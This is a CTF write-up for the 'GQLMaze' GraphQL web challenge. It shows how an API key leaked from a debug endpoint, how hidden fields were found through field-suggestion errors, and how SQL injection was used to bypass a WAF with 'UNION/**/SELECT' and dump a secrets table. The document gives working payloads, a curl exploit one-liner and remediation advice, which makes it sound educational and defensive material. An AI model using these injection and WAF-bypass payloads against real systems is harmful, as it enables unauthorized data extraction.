# GQLMaze — CTF Writeup

**Target:** `https://maze-vqg1.onrender.com/`
**Category:** Web / GraphQL
**Event:** UNI6CTF2
**Flag:** `UNI6CTF{gr4phql_f13ld_suggest10n_plus_sql1_ch41n_9b3d7e2f}`

---

## TL;DR

A four-stage chain:

1. A debug endpoint (`/api/status`) leaks the required API key.
2. GraphQL introspection is disabled, so the schema is mapped blind using **field-suggestion ("clairvoyance") leaks**, which reveal a hidden root field `searchUsers`.
3. `searchUsers` is **SQL-injectable** (SQLite) via a `LIKE` clause.
4. A simple **WAF** blocking `UNION SELECT` is bypassed with an inline comment (`UNION/**/SELECT`), and the flag is dumped from a hidden `secrets` table.

The flag text itself spells out the intended path: *graphql field suggestion + sqli chain*.

---

## Recon

The landing page is a small "GraphQL API Explorer" that POSTs to `/graphql` with an
`X-API-Key` header. An inline script comment hinted at a separate backend
(`uni6ctf2-gqlmaze.onrender.com`), but the Render host here is the backend itself.

`/graphql` rejected everything without a key:

```
{"errors":[{"message":"Missing or invalid X-API-Key"}]}
```

`robots.txt` pointed at the interesting surface:

```
User-agent: *
Disallow: /graphql
Disallow: /api/
```

## Stage 1 — API key leak via debug endpoint

Enumerating `/api/` turned up `/api/status`, which carried a leftover debug block:

```bash
curl -s https://maze-vqg1.onrender.com/api/status
```
```json
{
  "status": "online",
  "version": "2.0.0",
  "_debug": {
    "gql_endpoint": "/graphql",
    "api_key": "gqlm_7x9k2p4q8r1v5z3w",
    "note": "TODO: strip _debug before production"
  }
}
```

That key authenticates every `/graphql` request:

```
X-API-Key: gqlm_7x9k2p4q8r1v5z3w
```

## Stage 2 — Mapping the schema with introspection disabled

Introspection was blocked by a naïve **string filter** (it even fired on
`__schema`/`__type` appearing inside a comment), which made every syntactic
bypass — unicode escapes, inline comments/whitespace, length padding, batching,
`application/graphql`, request-splitting — useless:

```json
{"errors":[{"message":"GraphQL introspection is disabled on this endpoint."}]}
```

The visible Query root was only `status`, `user(id: Int!)`, and `users`, all with
flat scalar types (`User{id,username,email,role}`, `Status{online,version,uptime}`).
No mutations, no subscriptions, no hidden arguments — and no flag anywhere.

**Clairvoyance:** GraphQL's "Did you mean …?" validation errors leak sibling field
names. Brute-forcing root field guesses, the guess `secretUser` produced:

```
Cannot query field "secretUser" on type "Query". Did you mean "searchUsers"?
```

A hidden root field — `searchUsers(query: String!): [User]`.

## Stage 3 — SQL injection in `searchUsers`

`searchUsers` did a substring match (`LIKE '%<query>%'`). Signs of injection:

- `%` and `_` behaved as SQL `LIKE` wildcards (matched every row).
- `' OR 1=1 -- ` returned **all** rows, even though no user literally contains
  that string (a parameterised query would have returned nothing).
- `u'nion` leaked a raw error — `near "nion": syntax error` — the SQLite error
  format, confirming the backend DB.

Underlying query (reconstructed):

```sql
SELECT id, username, email, role
FROM users
WHERE username LIKE '%<query>%' OR email LIKE '%<query>%'
```

## Stage 4 — WAF bypass and flag extraction

A WAF blocked the phrase `UNION SELECT`:

```json
{"errors":[{"message":"Potential injection detected by WAF", ... }]}
```

Individual keywords (`UNION`, `SELECT`, `OR`, `FROM`, `--`) were fine — only the
adjacent phrase matched (a `union\s+select`-style rule). An inline SQL comment
splits the phrase and slips past it: `UNION/**/SELECT`.

The result set maps to 4 columns (`id, username, email, role`), so a 4-column
UNION works. Dumping the schema via `sqlite_master`:

```
query: zzz' UNION/**/SELECT 1,name,sql,type FROM/**/sqlite_master -- 
```
```
name=secrets  sql=CREATE TABLE secrets ( id INTEGER PRIMARY KEY, flag TEXT NOT NULL )
name=users    sql=CREATE TABLE users (...)
```

A `secrets(id, flag)` table. Extract it:

```
query: zzz' UNION/**/SELECT id,flag,flag,flag FROM/**/secrets -- 
```
```json
{"data":{"searchUsers":[{"id":1,
  "username":"UNI6CTF{gr4phql_f13ld_suggest10n_plus_sql1_ch41n_9b3d7e2f}", ...}]}}
```

## Flag

```
UNI6CTF{gr4phql_f13ld_suggest10n_plus_sql1_ch41n_9b3d7e2f}
```

---

## Full exploit (one-liner for the final step)

```bash
API='https://maze-vqg1.onrender.com/graphql'
KEY='gqlm_7x9k2p4q8r1v5z3w'
PAYLOAD="zzz' UNION/**/SELECT id,flag,flag,flag FROM/**/secrets -- "

curl -s -X POST "$API" \
  -H 'Content-Type: application/json' \
  -H "X-API-Key: $KEY" \
  --data-binary "$(python3 -c "import json,sys;print(json.dumps({'query':'{ searchUsers(query:'+json.dumps(sys.argv[1])+') { username } }'}))" "$PAYLOAD")"
```

## Remediation notes

- **Strip debug output** (`_debug`) before production — it leaked the API key.
- **Disable field suggestions** in production (`graphql` `validate` without the
  suggestion hints, or set a custom validation rule), since they leak schema even
  when introspection is off.
- **Use parameterised queries / bound parameters** instead of string interpolation;
  a keyword-blocklist WAF is not a substitute and is trivially bypassed
  (`UNION/**/SELECT`, case mixing, etc.).
- Least-privilege the DB account and keep secret data out of the same database the
  public API can reach.
